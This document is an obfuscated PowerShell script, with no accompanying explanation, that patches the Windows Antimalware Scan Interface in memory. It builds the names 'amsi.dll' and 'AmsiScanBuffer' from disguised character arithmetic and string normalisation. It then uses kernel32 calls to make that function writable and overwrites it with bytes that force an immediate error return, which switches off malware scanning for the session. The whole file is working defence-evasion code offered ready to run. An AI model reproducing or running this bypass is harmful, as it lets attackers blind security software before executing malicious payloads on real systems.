$JLXfd4PKPiY = @"
using System;
using System.Runtime.InteropServices;
public class JLXfd4PKPiY {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FDKGFBKcay9KAICgUj, string vvKHCJ7IsOGh06Y);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ehb3RCzh, UIntPtr VOF, uint Ve9uB, out uint ebuZtzsmo);
}
"@

Add-Type $JLXfd4PKPiY

$TdqKMB = [JLXfd4PKPiY]::LoadLibrary("$([char](97*5/5)+[CHar]([ByTe]0x6d)+[cHaR](99+16)+[ChAr]([ByTe]0x69)+[ChAR](46*20/20)+[ChAr]([Byte]0x64)+[cHAr]([BYTE]0x6c)+[ChaR](9+99))")
$JRMQESFuB = [JLXfd4PKPiY]::GetProcAddress($TdqKMB, "$(('ÀmsîScàn'+'Bùffêr').NOrMAlizE([Char]([bYtE]0x46)+[cHAr]([BytE]0x6f)+[cHAR](102+12)+[chAR]([byTE]0x6d)+[chaR]([bYTE]0x44)) -replace [cHaR](92+87-87)+[chAr](112*3/3)+[chAR](123*106/106)+[CHAR](77+32-32)+[chaR]([ByTe]0x6e)+[char](125+65-65))")
$p = 0
[JLXfd4PKPiY]::VirtualProtect($JRMQESFuB, [uint32]5, 0x40, [ref]$p)
$bSw0JL2gMMwHwVaD = "0xB8"
$PL8rbgjg3 = "0x57"
$dvk = "0x00"
$IuT77xpqlx = "0x07"
$_mBGywD = "0x80"
$rwT4MVy4_UDn_ = "0xC3"
$rYVKMQzkkzv = [Byte[]] ($bSw0JL2gMMwHwVaD,$PL8rbgjg3,$dvk,$IuT77xpqlx,+$_mBGywD,+$rwT4MVy4_UDn_)
[System.Runtime.InteropServices.Marshal]::Copy($rYVKMQzkkzv, 0, $JRMQESFuB, 6)